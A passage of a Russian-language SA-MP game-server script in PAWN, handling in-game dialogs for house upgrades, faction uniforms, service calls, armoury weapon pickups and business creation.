			if(price < 1 || price > 3) return ShowPlayerDialog(playerid, D_HOME+5, 1, "Панель", "{FFFFFF}Введите на сколько умножется зарплата\n1 - зп от 2тыс до 10тыс\n2 - зп от 4тыс до 20тыс\n3 - зп от 6тыс до 30тыс\n{FFFF00}Примечание:\n{FFFFFF}Значение может быть от 1 до 3", "Принять", "Отмена");
			MP1[4] = price;
			SendMes(playerid, COLOR_LIGHTGREEN, "Значение зарплаты умножается: %i раз(а)", price);
			format(MerPanel, sizeof(MerPanel),"%i, %i, %i, %i, %i, %i", MP1[0], MP1[1], MP1[2], MP1[3], MP1[4], MP1[5]);
			MysqlUpdateOtherStr("merpanel", MerPanel);
		}
	case D_HOME+6:
		{
			if(!response) return 1;
			switch(listitem)
			{
				case 0: ShowPlayerDialog(playerid, D_HOME+7, 1, "Панель", "{FFFFFF}Введите цену лечения\n\n{FFFF00}Примечание:\n{FFFFFF}Цена может быть от 0 до 500", "Принять", "Отмена");
			}
		}
	case D_HOME+7:
		{
			if(!response) return 1;
			new price;
			if(sscanf(inputtext, "i",price)) return ShowPlayerDialog(playerid, D_HOME+7, 1, "Панель", "{FFFFFF}Введите цену лечения\n\n{FFFF00}Примечание:\n{FFFFFF}Цена может быть от 0 до 500", "Принять", "Отмена");
			if(price < 0 || price > 500) return ShowPlayerDialog(playerid, D_HOME+7, 1, "Панель", "{FFFFFF}Введите цену лечения\n\n{FFFF00}Примечание:\n{FFFFFF}Цена может быть от 0 до 500", "Принять", "Отмена");
			MP1[5] = price;
			SendMes(playerid, COLOR_LIGHTGREEN, "Цена за лечение состовляет: %iр", price);
			format(MerPanel, sizeof(MerPanel),"%i, %i, %i, %i, %i, %i", MP1[0], MP1[1], MP1[2], MP1[3], MP1[4], MP1[5]);
			MysqlUpdateOtherStr("merpanel", MerPanel);
		}
	case D_RADAR+1:
		{
			if(!response) return 1;
			switch(listitem)
			{
				case 0: ShowPlayerDialog(playerid, D_RADAR+2, 1, "Панель", "{FFFFFF}Введите цену за 1 превышенный км\n\n{FFFF00}Примечание:\n{FFFFFF}Цена может быть от 1 до 300", "Принять", "Отмена");
			}
		}
	case D_RADAR+2:
		{
			if(!response) return 1;
			new price;
			if(sscanf(inputtext, "i",price)) return ShowPlayerDialog(playerid, D_RADAR+2, 1, "Панель", "{FFFFFF}Введите цену за 1 превышенный км\n\n{FFFF00}Примечание:\n{FFFFFF}Цена может быть от 1 до 300", "Принять", "Отмена");
			if(price < 1 || price > 300) return ShowPlayerDialog(playerid, D_RADAR+2, 1, "Панель", "{FFFFFF}Введите цену за 1 превышенный км\n\n{FFFF00}Примечание:\n{FFFFFF}Цена может быть от 1 до 300", "Принять", "Отмена");
			MD[0] = price;
			SendMes(playerid, COLOR_LIGHTGREEN, "Цена за 1 превышенный км составляет: %iр", price);
			format(MdPanel, sizeof(MdPanel),"%i, %i, %i, %i, %i, %i", MD[0], MD[1], MD[2], MD[3], MD[4], MD[5]);
			MysqlUpdateOtherStr("mdpanel", MdPanel);
		}
	case D_HOMEULUCH:
	    {
	        if(!response) return callcmd::hmenu(playerid);
	        switch(listitem)
	        {
	            case 0:
	            {
	                new string[112];
	                format(string, sizeof(string),"{FFFFFF}Автоматические двери - выход из дома или из гаража в дом станет доступным на клавишу {FFFF00}Левый ALT.");
	                ShowPlayerDialog(playerid,D_HOMEULUCH+1,DIALOG_STYLE_MSGBOX,"Автоматические двери",string,"Купить","Назад");
	            }
	            case 1:
	            {
	                new string[84];
				    format(string, sizeof(string),"{FFFFFF}Гараж - помещение для стоянки, а иногда и ремонта автомобилей, мотоциклов.");
                    ShowPlayerDialog(playerid,D_HOMEULUCH+2,DIALOG_STYLE_MSGBOX,"Гараж",string,"Купить","Назад");
	            }
	        }
	    }
    case D_HOMEULUCH+1:
		{
		    if(!response)
		    {
		        new string[112];
          		format(string, sizeof(string),"{FFFFFF}Автоматические двери - выход из дома или из гаража в дом станет доступным на клавишу {FFFF00}Левый ALT.");
          		ShowPlayerDialog(playerid,D_HOMEULUCH+1,DIALOG_STYLE_MSGBOX,"Автоматические двери",string,"Купить","Назад");
                return 1;
		    }
		    new a = GetPVarInt(playerid, "PlayerHouse");
		    if(HouseInfo[a][hAutoDoors]) return SendClientMessage(playerid,COLOR_GREY,"У Вас уже имеются автоматические двери в доме!");
			if(GetMoney(playerid) < 25000) return SendMess(playerid, MSG_NOT_MONEY);
			GiveMoney(playerid, -25000);
			HouseInfo[a][hAutoDoors] = 1;
			MysqlUpdateHouseInt(a, "hAutoDoors", HouseInfo[a][hAutoDoors]);
			SendClientMessage(playerid, COLOR_LIME, "Теперь в Вашем доме имеются автоматические двери!");
			UpdateDynamic3DTextLabelText(HouseInfo[a][hPickupExit], COLOR_WHITE, "{FFFFFF}Для выхода используйте:\n {FFCC00}L.ALT\n{FFFFFF}Управление домом: \n{0099FF}/hmenu");
			return 1;
		}
	case D_HOMEULUCH+2:
		{
		    if(!response)
		    {
		        new string[84];
				format(string, sizeof(string),"{FFFFFF}Гараж - помещение для стоянки, а иногда и ремонта автомобилей, мотоциклов.");
                ShowPlayerDialog(playerid,D_HOMEULUCH+2,DIALOG_STYLE_MSGBOX,"Гараж",string,"Купить","Назад");
                return 1;
		    }
		    new a = GetPVarInt(playerid, "PlayerHouse");
		    if(HouseInfo[a][hGarage]) return SendClientMessage(playerid,COLOR_GREY,"У Вас уже имеется гараж в доме!");
			if(GetMoney(playerid) < 75000) return SendMess(playerid, MSG_NOT_MONEY);
			GiveMoney(playerid, -75000);
			HouseInfo[a][hGarage] = 1;
			MysqlUpdateHouseInt(a, "hGarage", HouseInfo[a][hGarage]);
			SendClientMessage(playerid, COLOR_LIME, "Теперь в Вашем доме имеется гараж!");
			return 1;
		}
	case 15419:
  	{
			if(!response) return 1;
			switch(listitem)
			{
        		case 0:
				{
					if(!PI[playerid][pModel]) return 1;
                    SetPlayerSkin(playerid, PI[playerid][pModel]);
					SendClientMessage(playerid,COLOR_YELLOW,"Вы переоделись в гражданскую форму");
				}
				case 1:
				{
					if(!PI[playerid][pMemberSkin]) return SendClientMessage(playerid,COLOR_GREY,"Вы не состоите в организации");
					SetPlayerSkin(playerid, PI[playerid][pMemberSkin]);
					SendClientMessage(playerid,COLOR_YELLOW,"Вы надели форму организации");
				}
				case 2:
				{
					if(PI[playerid][pRank] >= 3)
				 	{
						SetPlayerSkin(playerid, 179);
						SendClientMessage(playerid,COLOR_YELLOW,"Вы переоделись в постовую форму!");
				 	}
				 	return 1;
			 	}
				case 3:
           	 	{
           	    	if(PI[playerid][pRank] >= 1)
				 	{
						SetPlayerSkin(playerid, 287);
						SendClientMessage(playerid,COLOR_YELLOW,"Вы переоделись в спортивную форму!");
				 	}
				 	return 1;
			 	}
				case 4:
				{
		   	    	if(PI[playerid][pRank] >= 3)
			     	{
				 		SetPlayerSkin(playerid, 61);
				    	SendClientMessage(playerid,COLOR_YELLOW,"Вы надели форму 'Боевой Готовности'");
					}
					return 1;
			 	}
			}
		}
	case 1543:
		{
			if(!response) return callcmd::hmenu(playerid);
			if(listitem == 3)
			{
			    if(!PI[playerid][pMemberSkin]) return SendClientMessage(playerid, COLOR_GREY, "Вы не состоите в организации");
				SetPlayerSkin(playerid, PI[playerid][pMemberSkin]);
				SendClientMessage(playerid, COLOR_YELLOW, "Вы надели форму организации");
			}
			else
			{
			    if(!PI[playerid][pSkin][listitem]) return SendClientMessage(playerid, COLOR_GREY, "У Вас нет одежды на этой полке");
				PI[playerid][pModel] = PI[playerid][pSkin][listitem];
				SetPlayerSkin(playerid, PI[playerid][pModel]);
				MysqlUpdatePlayerInt(playerid, "model", PI[playerid][pModel]);
				SendClientMessage(playerid, COLOR_YELLOW, "Вы надели одежду из шкафа");
			}
		}
	case D_HEAL+3:
		{
			if(!response) return 1;
			switch(listitem)
			{
				case 0: ShowPlayerDialog(playerid, D_SERVICE+1, 1, "Вызвать механика", "{FFFFFF}Опишите место где Вы находитесь\n{AFAFAF}Сообщение должно состоять из 6 до 20 символов!", "Принять", "Отмена");
				case 1: ShowPlayerDialog(playerid, D_SERVICE+2, 1, "Вызвать такси", "{FFFFFF}Опишите место где Вы находитесь\n{AFAFAF}Сообщение должно состоять из 6 до 20 символов!", "Принять", "Отмена");
				case 2: ShowPlayerDialog(playerid, D_SERVICE+3, 1, "Вызвать скорую помощь", "{FFFFFF}Опишите место где Вы находитесь\n{AFAFAF}Сообщение должно состоять из 6 до 20 символов!", "Принять", "Отмена");
				case 3: ShowPlayerDialog(playerid, D_SERVICE+4, 1, "Вызвать полицию", "{FFFFFF}Опишите место где Вы находитесь\n{AFAFAF}Сообщение должно состоять из 6 до 20 символов!", "Принять", "Отмена");
			}
		}
	case 15420:
		{
			if(!response) return 1;
			switch(listitem)
			{
        		case 0:
				{
					if(!PI[playerid][pModel]) return 1;
                    SetPlayerSkin(playerid, PI[playerid][pModel]);
					SendClientMessage(playerid,COLOR_YELLOW,"Вы переоделись!");
				}
				case 1:
				{
					if(!PI[playerid][pMemberSkin]) return SendClientMessage(playerid,COLOR_GREY,"Вы не состоите в организации");
					SetPlayerSkin(playerid, PI[playerid][pMemberSkin]);
					SendClientMessage(playerid,COLOR_YELLOW,"Вы надели форму организации");
				}
				case 2:
				{
					if(PI[playerid][pRank] >= 3)
				 	{
						SetPlayerSkin(playerid, 222);
						SendClientMessage(playerid,COLOR_YELLOW,"Вы надели форму 'Боевой Готовности'");
				 	}
				 	return 1;
			 	}
				case 3:
           	 	{
           	    	if(PI[playerid][pRank] >= 3)
				 	{
						SetPlayerSkin(playerid, 118);
						SendClientMessage(playerid,COLOR_YELLOW,"Вы надели форму 'Одежда (Якудза)'");
				 	}
				 	return 1;
			 	}
				case 4:
				{
		   	    	if(PI[playerid][pRank] >= 3)
			     	{
				 		SetPlayerSkin(playerid, 111);
				    	SendClientMessage(playerid,COLOR_YELLOW,"Вы надели форму 'Одежда (Русская Мафия)'");
					}
					return 1;
			 	}
				case 5:
			 	{
			    	if(PI[playerid][pRank] >= 3)
			    	{
						SetPlayerSkin(playerid, 117);
						SendClientMessage(playerid,COLOR_YELLOW,"Вы надели форму 'Одежда (ОПГ Подольское)'");
			     	}
			     	return 1;
			 	}
				case 6:
		 	 	{
		 	    	if(PI[playerid][pRank] >= 3)
    				{
						SetPlayerSkin(playerid, 124);
						SendClientMessage(playerid,COLOR_YELLOW,"Вы надели форму 'Одежда (ОПГ Тамбовское)'");
					}
					return 1;
			 	}
			}
		}
    case 15421:
		{
			if(!response) return 1;
			switch(listitem)
			{
        		case 0:
				{
					if(!PI[playerid][pModel]) return 1;
                    SetPlayerSkin(playerid, PI[playerid][pModel]);
					SendClientMessage(playerid,COLOR_YELLOW,"Вы переоделись в гражданскую форму");
				}
				case 1:
				{
					if(!PI[playerid][pMemberSkin]) return SendClientMessage(playerid,COLOR_GREY,"Вы не состоите в организации");
					SetPlayerSkin(playerid, PI[playerid][pMemberSkin]);
					SendClientMessage(playerid,COLOR_YELLOW,"Вы надели форму организации");
				}
			}
		}
	case D_SERVICE+1:
		{
		    if(!response)
			{
			    if(PI[playerid][pJail] > 0) return SendClientMessage(playerid, COLOR_GREY, "У Вас изъяли телефон!");
				return ShowPlayerDialog(playerid, D_HEAL+3, 2, "Сервисы", "1. Вызвать механика\n2. Вызвать такси\n3. Вызвать скорую помошь\n4. Вызвать полицию", "Принять", "Назад");
			}
			if(GetPlayerInterior(playerid) != 0) return SendClientMessage(playerid, COLOR_GREY, "[Диспетчер] Не удалось определить Ваше местоположение. Выйдите из помещения.");
			if(GetPlayerVirtualWorld(playerid) != 0) return SendClientMessage(playerid, COLOR_GREY, "[Диспетчер] Не удалось определить Ваше местоположение. Выйдите из помещения.");
			if(GetPVarInt(playerid, "CallMech") > gettime()) return SendClientMessage(playerid, COLOR_GREY, "Вы недавно вызывали механика!");
			if(strlen(inputtext) < 6 || strlen(inputtext) > 20) return SendClientMessage(playerid, COLOR_GREY, "В сообщении должно быть от 6 до 20 символов!");
			new full = 0;
			foreach(new i: Player)
			{
				if(PlayerLogged[i] == false) continue;
				if(PI[i][pJob] == JOB_MECHANIC && i != playerid) full++;
			}
			if(!full) SendClientMessage(playerid, COLOR_GREY, "В данный момент нет механиков на дежурстве!");
			else SendClientMessage(playerid, COLOR_LIGHTBLUE, "Ваш запрос послан механикам. Ждите ответа");
			MechanicON[playerid] = true;
			new trr[3];
			if(IsPlayerToSquare(playerid,-891.3302,-2950.0190,2915.9917,560.3257)) trr = "";
			else if(IsPlayerToSquare(playerid,-2929.6589,-2889.1660,-1326.9077,1493.1770)) trr = "";
			else trr = "";
			foreach(new i: Player)
			{
				if(PlayerLogged[i] == false) continue;
				if(PI[i][pJob] == JOB_MECHANIC)
				{
					SendMes(i, COLOR_WHITE, "%s[%i] {FFFF00}с города {FFFFFF}%s{FFFF00}, вызывает механика, местоположение: {FFFFFF}%s", GetName(playerid), playerid, trr, inputtext);
					SendClientMessage(i, COLOR_YELLOW, "Чтобы принять вызов введите {FFFFFF}/gomechanic");
				}
			}
		}
    case D_SERVICE+2:
		{
		    if(!response)
			{
			    if(PI[playerid][pJail] > 0) return SendClientMessage(playerid, COLOR_GREY, "У Вас изъяли телефон!");
				return ShowPlayerDialog(playerid, D_HEAL+3, 2, "Сервисы", "1. Вызвать механика\n2. Вызвать такси\n3. Вызвать скорую помошь\n4. Вызвать полицию", "Принять", "Назад");
			}
			if(GetPlayerInterior(playerid) != 0) return SendClientMessage(playerid, COLOR_GREY, "[Диспетчер] Не удалось определить Ваше местоположение. Выйдите из помещения.");
			if(GetPlayerVirtualWorld(playerid) != 0) return SendClientMessage(playerid, COLOR_GREY, "[Диспетчер] Не удалось определить Ваше местоположение. Выйдите из помещения.");
			if(GetPVarInt(playerid, "CallTaxi") > gettime()) return SendClientMessage(playerid, COLOR_GREY, "Вы недавно вызывали таксиста!");
			if(strlen(inputtext) < 6 || strlen(inputtext) > 20) return SendClientMessage(playerid, COLOR_GREY, "В сообщении должно быть от 6 до 20 символов!");
			new full = 0;
			foreach(new i: Player)
			{
				if(PlayerLogged[i] == false) continue;
				if(PI[i][pJob] == JOB_TAXI && i != playerid) full++;
			}
			if(!full) SendClientMessage(playerid, COLOR_GREY, "В данный момент нет таксистов на дежурстве!");
			else SendClientMessage(playerid, COLOR_LIGHTBLUE, "Ваш запрос послан таксистам. Ждите ответа");
			TaxiON[playerid] = true;
			new trr[3];
			if(IsPlayerToSquare(playerid,-891.3302,-2950.0190,2915.9917,560.3257)) trr = "";
			else if(IsPlayerToSquare(playerid,-2929.6589,-2889.1660,-1326.9077,1493.1770)) trr = "";
			else trr = "";
			foreach(new i: Player)
			{
				if(PlayerLogged[i] == false) continue;
				if(PI[i][pJob] == JOB_TAXI)
				{
					SendMes(i, COLOR_WHITE, "%s[%i] {FFFF00}с города {FFFFFF}%s{FFFF00}, вызывает такси, местоположение: {FFFFFF}%s", GetName(playerid), playerid, trr, inputtext);
					SendClientMessage(i, COLOR_YELLOW, "Чтобы принять вызов введите {FFFFFF}/gotaxi");
				}
			}
		}
    case D_SERVICE+3:
		{
		    if(!response)
			{
			    if(PI[playerid][pJail] > 0) return SendClientMessage(playerid, COLOR_GREY, "У Вас изъяли телефон!");
				return ShowPlayerDialog(playerid, D_HEAL+3, 2, "Сервисы", "1. Вызвать механика\n2. Вызвать такси\n3. Вызвать скорую помошь\n4. Вызвать полицию", "Принять", "Назад");
			}
			if(GetPlayerInterior(playerid) != 0) return SendClientMessage(playerid, COLOR_GREY, "[Диспетчер] Не удалось определить Ваше местоположение. Выйдите из помещения.");
			if(GetPlayerVirtualWorld(playerid) != 0) return SendClientMessage(playerid, COLOR_GREY, "[Диспетчер] Не удалось определить Ваше местоположение. Выйдите из помещения.");
			if(GetPVarInt(playerid, "CallMedic") > gettime()) return SendClientMessage(playerid, COLOR_GREY, "Вы недавно вызывали скорую помощь!");
			if(strlen(inputtext) < 6 || strlen(inputtext) > 20) return SendClientMessage(playerid, COLOR_GREY, "В сообщении должно быть от 6 до 20 символов!");
			new full = 0;
			foreach(new i: Player)
			{
				if(PlayerLogged[i] == false) continue;
				if(IsAMedic(i) && i != playerid) full++;
			}
			if(!full) SendClientMessage(playerid, COLOR_GREY, "В данный момент нет медиков на дежурстве!");
			else SendClientMessage(playerid, COLOR_LIGHTBLUE, "Ваш запрос на медицинскую помощь послан. Ждите ответа");
			MedicON[playerid] = true;
			new trr[3];
			if(IsPlayerToSquare(playerid,-891.3302,-2950.0190,2915.9917,560.3257)) trr = "";
			else if(IsPlayerToSquare(playerid,-2929.6589,-2889.1660,-1326.9077,1493.1770)) trr = "";
			else trr = "";
			foreach(new i: Player)
			{
				if(PlayerLogged[i] == false) continue;
				if(IsAMedic(i))
				{
					SendMes(i, COLOR_WHITE, "%s[%i] {FFFF00}с города {FFFFFF}%s{FFFF00}, вызывает скорую помощь, местоположение: {FFFFFF}%s", GetName(playerid), playerid, trr, inputtext);
					SendClientMessage(i, COLOR_YELLOW, "Чтобы принять вызов введите {FFFFFF}/gomedhelp");
				}
			}
		}
	case D_SERVICE+4:
		{
		    if(!response)
			{
			    if(PI[playerid][pJail] > 0) return SendClientMessage(playerid, COLOR_GREY, "У Вас изъяли телефон!");
				return ShowPlayerDialog(playerid, D_HEAL+3, 2, "Сервисы", "1. Вызвать механика\n2. Вызвать такси\n3. Вызвать скорую помошь\n4. Вызвать полицию", "Принять", "Назад");
			}
			if(GetPlayerInterior(playerid) != 0) return SendClientMessage(playerid, COLOR_GREY, "[Диспетчер] Не удалось определить Ваше местоположение. Выйдите из помещения.");
			if(GetPlayerVirtualWorld(playerid) != 0) return SendClientMessage(playerid, COLOR_GREY, "[Диспетчер] Не удалось определить Ваше местоположение. Выйдите из помещения.");
			if(GetPVarInt(playerid, "CallPolice") > gettime()) return SendClientMessage(playerid, COLOR_GREY, "Вы недавно вызывали полицию!");
			if(strlen(inputtext) < 6 || strlen(inputtext) > 20) return SendClientMessage(playerid, COLOR_GREY, "В сообщении должно быть от 6 до 20 символов!");
			new full = 0;
			foreach(new i: Player)
			{
				if(PlayerLogged[i] == false) continue;
				if(IsACop(i) && i != playerid) full++;
			}
			if(!full) SendClientMessage(playerid, COLOR_GREY, "В данный момент нет полицейских на дежурстве!");
			else SendClientMessage(playerid, COLOR_LIGHTBLUE, "Ваш запрос был отправлен полиции. Ждите ответа");
			PoliceON[playerid] = true;
			new trr[3];
			if(IsPlayerToSquare(playerid,-891.3302,-2950.0190,2915.9917,560.3257)) trr = "";
			else if(IsPlayerToSquare(playerid,-2929.6589,-2889.1660,-1326.9077,1493.1770)) trr = "";
			else trr = "";
			foreach(new i: Player)
			{
				if(PlayerLogged[i] == false) continue;
				if(IsACop(i))
				{
					SendMes(i, COLOR_WHITE, "%s[%i] {FFFF00}с города {FFFFFF}%s{FFFF00}, вызывает полицию, местоположение: {FFFFFF}%s", GetName(playerid), playerid, trr, inputtext);
					SendClientMessage(i, COLOR_YELLOW, "Чтобы принять вызов введите {FFFFFF}/gopolice");
				}
			}
		}
    case D_ARMYGUN:
    {
        if(!response) return 1;
		new newslot;
        switch(listitem)
        {
            case 0:
            {
                if(CheckMaxVes(playerid,24,1,newslot)==1)return SendClientMessage(playerid,COLOR_GREY,"У Вас нет свободного места в инвентаре!");
				GivePlayerWeapon(playerid, 30, 60);
				SendClientMessage(playerid, COLOR_BLUE, "Вы взяли АК-47");
				if(PI[playerid][pSex] == 1) MeAction(playerid, "взял АК-47");
				else MeAction(playerid, "взяла АК-47");
            }
            case 1:
            {
                if(CheckMaxVes(playerid,21,1,newslot)==1)return SendClientMessage(playerid,COLOR_GREY,"У Вас нет свободного места в инвентаре!");
                SetPVarInt(playerid, "TazerGun", 1);
				GivePlayerWeapon(playerid, 23, 10);
				SendClientMessage(playerid, COLOR_BLUE, "Вы взяли Colt М1911");
				if(PI[playerid][pSex] == 1) MeAction(playerid, "взял Colt М1911");
				else MeAction(playerid, "взяла Colt М1911");
            }
            case 2:
            {
                if(CheckMaxVes(playerid,22,1,newslot)==1)return SendClientMessage(playerid,COLOR_GREY,"У Вас нет свободного места в инвентаре!");
				GivePlayerWeapon(playerid, 24, 35);
				SendClientMessage(playerid, COLOR_BLUE, "Вы взяли Desert Eagle");
				if(PI[playerid][pSex] == 1) MeAction(playerid, "взял Desert Eagle");
				else MeAction(playerid, "взяла Desert Eagle");
            }
            case 3:
            {
                if(CheckMaxVes(playerid,25,1,newslot)==1)return SendClientMessage(playerid,COLOR_GREY,"У Вас нет свободного места в инвентаре!");
                GivePlayerWeapon(playerid, 31, 60);
				SendClientMessage(playerid, COLOR_BLUE, "Вы взяли Colt M4");
				if(PI[playerid][pSex] == 1) MeAction(playerid, "взял Colt M4");
				else MeAction(playerid, "взяла Colt M4");
            }
            case 4:
            {
                if(CheckMaxVes(playerid,26,1,newslot)==1)return SendClientMessage(playerid,COLOR_GREY,"У Вас нет свободного места в инвентаре!");
                GivePlayerWeapon(playerid, 33, 20);
				SendClientMessage(playerid, COLOR_BLUE, "Вы взяли Иж 72");
				if(PI[playerid][pSex] == 1) MeAction(playerid, "взял Иж 72");
				else MeAction(playerid, "взяла Иж 72");
            }
            case 5:
            {
				SendClientMessage(playerid, COLOR_BLUE, "Вы взяли жезл, используйте /baton");
				if(PI[playerid][pSex] == 1) MeAction(playerid, "взял жезл");
				else MeAction(playerid, "взяла жезл");
				SetPlayerAttachedObject(playerid, 1, 1214, 6, -0.040454, 0.028840, -0.012862, 2.521301, 76.277267, 70.163467, 0.300000, 0.300000, 0.500000);
            }
        }
        SaveItem(playerid,newslot);
        SetHealth(playerid, 100);
    }
	case D_ARMOURY:
	    {
	        if(!response) return 1;
			new newslot;
	        switch(listitem)
	        {
            case 0:
            {
                if(CheckMaxVes(playerid,24,1,newslot)==1)return SendClientMessage(playerid,COLOR_GREY,"У Вас нет свободного места в инвентаре!");
				GivePlayerWeapon(playerid, 30, 60);
				SendClientMessage(playerid, COLOR_BLUE, "Вы взяли АК-47");
				if(PI[playerid][pSex] == 1) MeAction(playerid, "взял АК-47");
				else MeAction(playerid, "взяла АК-47");
            }
            case 1:
            {
                if(CheckMaxVes(playerid,21,1,newslot)==1)return SendClientMessage(playerid,COLOR_GREY,"У Вас нет свободного места в инвентаре!");
                SetPVarInt(playerid, "TazerGun", 1);
				GivePlayerWeapon(playerid, 23, 10);
				SendClientMessage(playerid, COLOR_BLUE, "Вы взяли Colt М1911");
				if(PI[playerid][pSex] == 1) MeAction(playerid, "взял Colt М1911");
				else MeAction(playerid, "взяла Colt М1911");
            }
            case 2:
            {
                if(CheckMaxVes(playerid,22,1,newslot)==1)return SendClientMessage(playerid,COLOR_GREY,"У Вас нет свободного места в инвентаре!");
				GivePlayerWeapon(playerid, 24, 35);
				SendClientMessage(playerid, COLOR_BLUE, "Вы взяли Desert Eagle");
				if(PI[playerid][pSex] == 1) MeAction(playerid, "взял Desert Eagle");
				else MeAction(playerid, "взяла Desert Eagle");
            }
            case 3:
            {
                if(CheckMaxVes(playerid,25,1,newslot)==1)return SendClientMessage(playerid,COLOR_GREY,"У Вас нет свободного места в инвентаре!");
                GivePlayerWeapon(playerid, 31, 60);
				SendClientMessage(playerid, COLOR_BLUE, "Вы взяли Colt M4");
				if(PI[playerid][pSex] == 1) MeAction(playerid, "взял Colt M4");
				else MeAction(playerid, "взяла Colt M4");
            }
            case 4:
            {
                if(CheckMaxVes(playerid,26,1,newslot)==1)return SendClientMessage(playerid,COLOR_GREY,"У Вас нет свободного места в инвентаре!");
                GivePlayerWeapon(playerid, 33, 20);
				SendClientMessage(playerid, COLOR_BLUE, "Вы взяли Иж 72");
				if(PI[playerid][pSex] == 1) MeAction(playerid, "взял Иж 72");
				else MeAction(playerid, "взяла Иж 72");
            }
	            case 5:
	            {
					if(PI[playerid][pMember] == TEAM_SWAT)
					{
						if(PI[playerid][pSex] == 1) MeAction(playerid, "взял бронижилет");
						else MeAction(playerid, "взяла бронижилет");

						SetPlayerAttachedObject(playerid, 3,19142, 1, 0.0, 0.056, 0.0, 0, 0, 0,1.3,1.3,1.1);

						return SetPlayerArmour(playerid, 100);
					}
  					SendClientMessage(playerid, COLOR_BLUE, "Вы взяли жезл, используйте /baton");
					if(PI[playerid][pSex] == 1) MeAction(playerid, "взял жезл");
					else MeAction(playerid, "взяла жезл");
					SetPlayerAttachedObject(playerid, 1, 1214, 6, -0.040454, 0.028840, -0.012862, 2.521301, 76.277267, 70.163467, 0.300000, 0.300000, 0.500000);
	            }
	        }
	        SaveItem(playerid,newslot);
	        SetHealth(playerid, 100);
		}
	case D_ARMOURY+4:
	    {
  			if(PhoneNumbers[playerid][5] < 40) return SendClientMessage(playerid, COLOR_GREY, "Недостаточно подарков!");
			{
			    new rand_money = random(99999);
			    PhoneNumbers[playerid][5] -= 40;
				MysqlUpdatePlayerInt(playerid, "phnumber6", PhoneNumbers[playerid][5]);
	  			GiveMoney(playerid, rand_money);
				new string[128];
				format(string,sizeof(string), "Подарки |{FFFFFF} Вы выиграли {bbbbbb}%dр{ffcd00} на игровой аккаунт", rand_money);
				SendClientMessage(playerid, 0xFFCD00FF, string);
			}
		}
		case D_STOPLOAD:
	    {
	        if(!response) return RemovePlayerFromVehicle(playerid);
			new vehicleid = GetPlayerVehicleID(playerid);
			if(!vehicleid) return 1;
			if(gVehicleGun[vehicleid][vGunLoading] == false && gVehicleGun[vehicleid][vGunUnloading] == false) return 1;
			gVehicleGun[vehicleid][vGunLoading] = false;
			gVehicleGun[vehicleid][vGunUnloading] = false;
			if(IsValidDynamic3DTextLabel(gVehicleGun[vehicleid][vGunText])) DestroyDynamic3DTextLabel(gVehicleGun[vehicleid][vGunText]);
			DestroyDynamicArea(gVehicleGun[vehicleid][vGunArea]);
			DestroyPickup(gVehicleGun[vehicleid][vGunPickup]);
			RemovePlayerAttachedObject(playerid, 3);
			gVehicleGun[vehicleid][vGunArea] = 0;
			gVehicleGun[vehicleid][vGunPickup] = 0;
			SendClientMessage(playerid, COLOR_GREEN, "Загрузка / разгрузка завершена");
			print("Iter_Remove(VehicleGun, vehicleid);");
			SetTimerEx("Itter_OPDCInternal_VehicleGun", 0, false, "i", vehicleid);
			return 1;
	    }
		case D_HEAL+6:
		{
			if(!response) return 1;

			new length = strlen(inputtext);
			if(!(1 <= length <= 32))
				return ShowPlayerDialog(playerid, D_HEAL+6, 1, "Бизнес", "ВАЖНО: Название\n\nПРИМЕР: Gas Station", "Принять", "Отмена");

			new name[32];
			if(sscanf(inputtext,"s[32]",name)) return ShowPlayerDialog(playerid, D_HEAL+6, 1, "Бизнес", "ВАЖНО: Название\n\nПРИМЕР: Gas Station", "Принять", "Отмена");
			TOTALBIZZ++;
			sscanf(boordh,"p<,>fffiii",
			BizzInfo[TOTALBIZZ][bExitx],BizzInfo[TOTALBIZZ][bExity],BizzInfo[TOTALBIZZ][bExitz],
			BizzInfo[TOTALBIZZ][bInt],BizzInfo[TOTALBIZZ][bMIcon], BizzInfo[TOTALBIZZ][bType]);
			GetPlayerPos(playerid,BizzInfo[TOTALBIZZ][bEntrx],BizzInfo[TOTALBIZZ][bEntry],BizzInfo[TOTALBIZZ][bEntrz]);
			strmid(BizzInfo[TOTALBIZZ][bOwner], "None", 0, strlen("None"), MAX_PLAYER_NAME);
			strmid(BizzInfo[TOTALBIZZ][bName], name, 0, strlen(name), 32);
			BizzInfo[TOTALBIZZ][bVirtual] = TOTALBIZZ;
			BizzInfo[TOTALBIZZ][bEnter] = 0;
			BizzInfo[TOTALBIZZ][bTill] = 50;


			/*
			{786.9420, -278.1934, 1034.9362, 360.0, 794.0880,-270.6746,1034.9054},		// 24/7
			{0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0},										// азс
			{-721.6511, 223.8630, 2022.8600, 180.0, -724.6412, 206.7564, 2022.7360},	// закусочная
			{-1499.9595,-296.6198,1762.7900, 270.0, -1498.5411, -300.3899, 1762.5275},	// бар
			{-187.3197, 880.8048, 2612.6399, 180.0, -186.4855, 856.6979, 2612.4531},	// клуб
			{540.4188, -844.3546, 1002.0000, 180.0, 541.7650,-851.2516,1002.0000},		// магазин оружия
			{0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0}, 										// сто
			{-913.9792, 1202.0702, 1002.0200, 360.0, -913.6543,1211.7676,1002.0200},	// магазин одежды
			{1600.3777, 972.5441, 1819.4937, 360.0, 1613.3817,997.2397,1819.0200},		// казино
			{637.1538,-1129.7153,1081.4840, 270.0, 641.7103,-1130.5568,1081.4840},		// транспортная компания
			{547.9608, 152.4057, 1001.6217, 180.0, 548.0253,145.9282,1001.6217},		// автосалон (легковые)
			{499.8424,-165.4606,861.8495, 180.0, 499.7893,-168.2329,861.8495}			// автосалон (грузовики)
			*/
			new tmpvar, tmpvar2;
			switch(BizzInfo[TOTALBIZZ][bType])
			{
			    case 1: tmpvar = 2000000, tmpvar2 = 10000; // 24/7
			    case 2: tmpvar = 4000000, tmpvar2 = 30000; // азс
			    case 3: tmpvar = 1300000, tmpvar2 = 5000; // закусочная
			    case 4: tmpvar = 1000000, tmpvar2 = 5000; // бар
			    case 5: tmpvar = 1000000, tmpvar2 = 5000; // клуб
			    case 6: tmpvar = 4000000, tmpvar2 = 50000; // магазин оружия
			    case 7: tmpvar = 4000000, tmpvar2 = 50000; // сто
			    case 8: tmpvar = 2500000, tmpvar2 = 50000; // магазин одежды
			    case 9: tmpvar = 12000000, tmpvar2 = 50000; // казино
				case 10: tmpvar = 10000000, tmpvar2 = 50000; // транспортная компания
				case 11: tmpvar = 10000000, tmpvar2 = 50000; // автосалон (легковые)
				case 12: tmpvar = 5000000, tmpvar2 = 50000; // автосалон (грузовики)
			}
			BizzInfo[TOTALBIZZ][bPrice] = tmpvar;
